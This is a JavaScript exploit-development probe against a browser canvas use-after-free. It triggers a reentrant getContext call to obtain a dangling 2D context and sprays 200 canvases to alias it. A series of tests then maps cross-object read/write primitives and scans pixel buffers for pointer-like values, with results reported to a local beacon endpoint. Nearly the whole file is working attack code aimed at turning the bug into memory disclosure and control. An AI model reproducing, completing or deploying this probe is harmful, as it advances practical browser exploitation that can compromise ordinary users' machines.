// p496 — Canvas UAF: Comprehensive aliased pair R/W probe
//
// V490 CONFIRMED: context is NOT freed (Ref<> keeps it alive).
// The aliased pair (dCtx1 + sprayX[idx1]) IS the exploit primitive.
// This probe maps out exactly what we can read/write and looks for
// pointer leaks through property getters.
//
// Tests:
// T1: fillStyle gradient identity (same JS object both sides?)
// T2: fillStyle gradient → free gradient → read from dangling
// T3: createImageData backing store address leak
// T4: getLineDash Vector deep copy or shared buffer?
// T5: measureText return value differences
// T6: save/restore with gradient → does restore give stale RefPtr?
// T7: toDataURL through aliased pair
//
// Beacon prefix: V496-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V496-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Create aliased pair ═══
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 100; tc1.height = 100;
  document.body.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  // Same-type spray
  var sprayC = [], sprayX = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    document.body.appendChild(c);
    sprayC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX.push(ctx);
  }

  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
    B('MISS', 'lw=' + lw1);
    return;
  }
  var idx1 = Math.round(lw1 - 500);
  B('ALIAS', 'idx=' + idx1);

  // Quick verify: write through spray, read through dangling
  sprayX[idx1].lineWidth = 777.25;
  var check = dCtx1.lineWidth;
  B('VERIFY', 'wrote=777.25,read=' + check + ',match=' + (check === 777.25));
  if (check !== 777.25) { B('ABORT', 'aliased-mismatch'); return; }

  // ═══ T1: fillStyle gradient identity ═══
  try {
    var grad1 = sprayX[idx1].createLinearGradient(0, 0, 100, 100);
    grad1.addColorStop(0, 'red');
    grad1.addColorStop(1, 'blue');

    // Set through spray
    sprayX[idx1].fillStyle = grad1;

    // Read through dangling
    var readStyle = dCtx1.fillStyle;

    B('T1-TYPE', typeof readStyle);
    B('T1-ISGRAD', '' + (readStyle instanceof CanvasGradient));
    B('T1-IDENTITY', 'same=' + (readStyle === grad1));

    // Read through spray (should definitely be grad1)
    var readSpray = sprayX[idx1].fillStyle;
    B('T1-SPRAY-ID', 'same=' + (readSpray === grad1));

    // Are dangling and spray reads the same?
    B('T1-CROSS', 'dang===spray=' + (readStyle === readSpray));
  } catch(e) { B('T1-ERR', e.message); }

  // ═══ T2: fillStyle gradient → free → read ═══
  try {
    // Create a gradient, set it, then try to free it
    var grad2 = sprayX[idx1].createLinearGradient(10, 10, 50, 50);
    grad2.addColorStop(0, '#00ff00');
    grad2.addColorStop(1, '#0000ff');

    sprayX[idx1].fillStyle = grad2;

    // Verify it's stored
    var readG2 = dCtx1.fillStyle;
    B('T2-SET', 'isGrad=' + (readG2 instanceof CanvasGradient));

    // Try to free the gradient by nulling our JS ref
    // But the State.fillStyle.m_style holds RefPtr<CanvasGradient>
    // So the gradient stays alive. Let's check.
    grad2 = null;
    readG2 = null;

    // GC
    for (var g = 0; g < 2000; g++) {
      var junk = new ArrayBuffer(256);
    }

    // Read again - should still work because State's RefPtr keeps it alive
    var readG2b = dCtx1.fillStyle;
    B('T2-AFTER-GC', 'isGrad=' + (readG2b instanceof CanvasGradient) + ',type=' + typeof readG2b);

    // Now change fillStyle to a color string → drops the RefPtr
    sprayX[idx1].fillStyle = '#ff0000';

    // Read through dangling → should be color string now
    var readG2c = dCtx1.fillStyle;
    B('T2-AFTER-CLR', 'val=' + readG2c + ',type=' + typeof readG2c);
  } catch(e) { B('T2-ERR', e.message); }

  // ═══ T3: createImageData ═══
  try {
    var imgA = sprayX[idx1].createImageData(100, 1);
    var imgB = dCtx1.createImageData(100, 1);

    B('T3-CREATE', 'lenA=' + imgA.data.length + ',lenB=' + imgB.data.length);
    B('T3-SAME-BUF', 'same=' + (imgA.data.buffer === imgB.data.buffer));

    // Write through A, read through B
    imgA.data[0] = 42;
    B('T3-CROSSRW', 'A[0]=42,B[0]=' + imgB.data[0] + ',shared=' + (imgB.data[0] === 42));

    // getImageData through both sides
    // First draw something
    sprayX[idx1].fillStyle = '#deadbe';
    sprayX[idx1].fillRect(0, 0, 10, 10);
    var pxA = sprayX[idx1].getImageData(0, 0, 10, 1);
    var pxB = dCtx1.getImageData(0, 0, 10, 1);
    B('T3-GETPX', 'A0=' + pxA.data[0] + ',' + pxA.data[1] + ',' + pxA.data[2] +
      ',B0=' + pxB.data[0] + ',' + pxB.data[1] + ',' + pxB.data[2]);
  } catch(e) { B('T3-ERR', e.message); }

  // ═══ T4: lineDash Vector test ═══
  try {
    var dash = [];
    for (var i = 0; i < 100; i++) dash.push(i + 0.5);

    sprayX[idx1].setLineDash(dash);
    var readDash = dCtx1.getLineDash();

    B('T4-LEN', 'set=' + dash.length + ',read=' + readDash.length);
    B('T4-VALS', 'r0=' + readDash[0] + ',r50=' + readDash[50] + ',r99=' + readDash[99]);

    // Now test: save, clear, read through dangling
    sprayX[idx1].save();
    sprayX[idx1].setLineDash([]);
    var readDash2 = dCtx1.getLineDash();
    B('T4-CLR', 'len=' + readDash2.length + ' (should be 0, same object)');

    // Restore
    sprayX[idx1].restore();
    var readDash3 = dCtx1.getLineDash();
    B('T4-RESTORE', 'len=' + readDash3.length + ',r0=' + readDash3[0]);
  } catch(e) { B('T4-ERR', e.message); }

  // ═══ T5: measureText ═══
  try {
    sprayX[idx1].font = '20px serif';
    var tmA = sprayX[idx1].measureText('Hello World');
    var tmB = dCtx1.measureText('Hello World');

    B('T5-WIDTH', 'A=' + tmA.width.toFixed(4) + ',B=' + tmB.width.toFixed(4) + ',eq=' + (tmA.width === tmB.width));

    // Check all TextMetrics properties
    var props = ['actualBoundingBoxAscent', 'actualBoundingBoxDescent',
                 'actualBoundingBoxLeft', 'actualBoundingBoxRight',
                 'fontBoundingBoxAscent', 'fontBoundingBoxDescent',
                 'alphabeticBaseline', 'hangingBaseline', 'ideographicBaseline'];
    var diffs = [];
    for (var p = 0; p < props.length; p++) {
      var vA = tmA[props[p]], vB = tmB[props[p]];
      if (vA !== vB) diffs.push(props[p] + ':' + vA + '/' + vB);
    }
    B('T5-DIFFS', diffs.length > 0 ? diffs.join(',') : 'all-equal');
  } catch(e) { B('T5-ERR', e.message); }

  // ═══ T6: save/restore gradient lifecycle ═══
  try {
    var grad3 = sprayX[idx1].createLinearGradient(0, 0, 50, 50);
    grad3.addColorStop(0, '#ffffff');
    grad3.addColorStop(1, '#000000');

    // Set gradient and save
    sprayX[idx1].fillStyle = grad3;
    sprayX[idx1].save();

    // Change to color
    sprayX[idx1].fillStyle = '#abcdef';

    // Read current (should be color)
    var cur6 = dCtx1.fillStyle;
    B('T6-CUR', 'val=' + cur6 + ',isStr=' + (typeof cur6 === 'string'));

    // Restore (should bring back gradient)
    sprayX[idx1].restore();
    var rest6 = dCtx1.fillStyle;
    B('T6-RESTORE', 'isGrad=' + (rest6 instanceof CanvasGradient) + ',same=' + (rest6 === grad3));

    // Null our JS ref to gradient
    grad3 = null;
    rest6 = null;

    // Read fillStyle — State still holds RefPtr
    var rest6b = dCtx1.fillStyle;
    B('T6-NOREF', 'isGrad=' + (rest6b instanceof CanvasGradient));
  } catch(e) { B('T6-ERR', e.message); }

  // ═══ T7: getTransform double values ═══
  try {
    // Set a known transform through spray
    sprayX[idx1].setTransform(1.5, 0.25, 0.75, 2.0, 10.5, 20.5);
    var tm = dCtx1.getTransform();
    B('T7-XFORM', 'a=' + tm.a + ',b=' + tm.b + ',c=' + tm.c + ',d=' + tm.d + ',e=' + tm.e + ',f=' + tm.f);

    // Write through dangling
    dCtx1.setTransform(3.14159, 2.71828, 1.41421, 1.73205, 42.0, 99.9);
    var tm2 = sprayX[idx1].getTransform();
    B('T7-CROSS', 'a=' + tm2.a.toFixed(5) + ',b=' + tm2.b.toFixed(5));
  } catch(e) { B('T7-ERR', e.message); }

  // ═══ T8: toDataURL through both sides ═══
  try {
    // Draw something recognizable
    sprayX[idx1].fillStyle = '#ff00ff';
    sprayX[idx1].fillRect(0, 0, 50, 50);

    // Read canvas data from both canvas elements
    // dCtx1's canvas is tc1, sprayX[idx1]'s canvas is sprayC[idx1]
    // They're the SAME context (same C++ object) but different CANVAS elements!
    // So the underlying ImageBuffer is from sprayC[idx1]'s canvas
    var urlA = sprayC[idx1].toDataURL();
    var urlB = tc1.toDataURL();
    B('T8-URLS', 'lenA=' + urlA.length + ',lenB=' + urlB.length + ',eq=' + (urlA === urlB));

    // The canvases are DIFFERENT HTML elements, so they have DIFFERENT ImageBuffers!
    // But the context draws on sprayC[idx1]'s buffer (m_canvas points to sprayC[idx1]).
    // Actually no — which canvas does the context ACTUALLY belong to after UAF?
    // dCtx1 was created on tc1 but the reentrant getContext replaced it.
    // The context that occupies the slot was created for sprayC[idx1].

    // Draw through dangling and check which canvas gets the pixels
    dCtx1.fillStyle = '#00ff00';
    dCtx1.fillRect(60, 0, 30, 30);

    var urlA2 = sprayC[idx1].toDataURL();
    var urlB2 = tc1.toDataURL();
    B('T8-DRAW', 'A-changed=' + (urlA2 !== urlA) + ',B-changed=' + (urlB2 !== urlB));
  } catch(e) { B('T8-ERR', e.message); }

  // ═══ T9: Enumerate all readable properties for pointer traces ═══
  try {
    var propDump = [];
    var testProps = ['lineWidth', 'lineCap', 'lineJoin', 'miterLimit',
                     'shadowOffsetX', 'shadowOffsetY', 'shadowBlur', 'shadowColor',
                     'globalAlpha', 'globalCompositeOperation', 'font',
                     'textAlign', 'textBaseline', 'direction',
                     'imageSmoothingEnabled', 'imageSmoothingQuality',
                     'lineDashOffset', 'fillStyle', 'strokeStyle'];

    for (var p = 0; p < testProps.length; p++) {
      var name = testProps[p];
      try {
        var val = dCtx1[name];
        propDump.push(name + '=' + JSON.stringify(val).substring(0, 40));
      } catch(e) {
        propDump.push(name + '=ERR:' + e.message.substring(0, 20));
      }
    }

    // Send in chunks (URL length limit)
    var chunk1 = propDump.slice(0, 10).join('|');
    var chunk2 = propDump.slice(10).join('|');
    B('T9-PROPS1', chunk1);
    B('T9-PROPS2', chunk2);
  } catch(e) { B('T9-ERR', e.message); }

  // ═══ T10: Float64Array view of getImageData buffer ═══
  try {
    // getImageData returns pixels from the canvas. The backing Uint8ClampedArray
    // has an ArrayBuffer. We can create Float64Array over the same buffer.
    dCtx1.fillStyle = '#deadbe';
    dCtx1.fillRect(0, 0, 100, 100);
    var px = dCtx1.getImageData(0, 0, 100, 100);
    var f64 = new Float64Array(px.data.buffer);

    // Scan for non-zero values that look like pointers
    var ptrLike = [];
    for (var i = 0; i < Math.min(f64.length, 500); i++) {
      var v = f64[i];
      // Skip NaN and normal pixel values
      if (v !== 0 && !isNaN(v) && Math.abs(v) > 1e15) {
        ptrLike.push(i + ':' + v.toString(16).substring(0, 16));
      }
    }
    B('T10-F64', 'len=' + f64.length + ',ptrs=' + ptrLike.length +
      (ptrLike.length > 0 ? ',first=' + ptrLike[0] : ''));
  } catch(e) { B('T10-ERR', e.message); }

  B('DONE', 'all-tests-complete');
})();
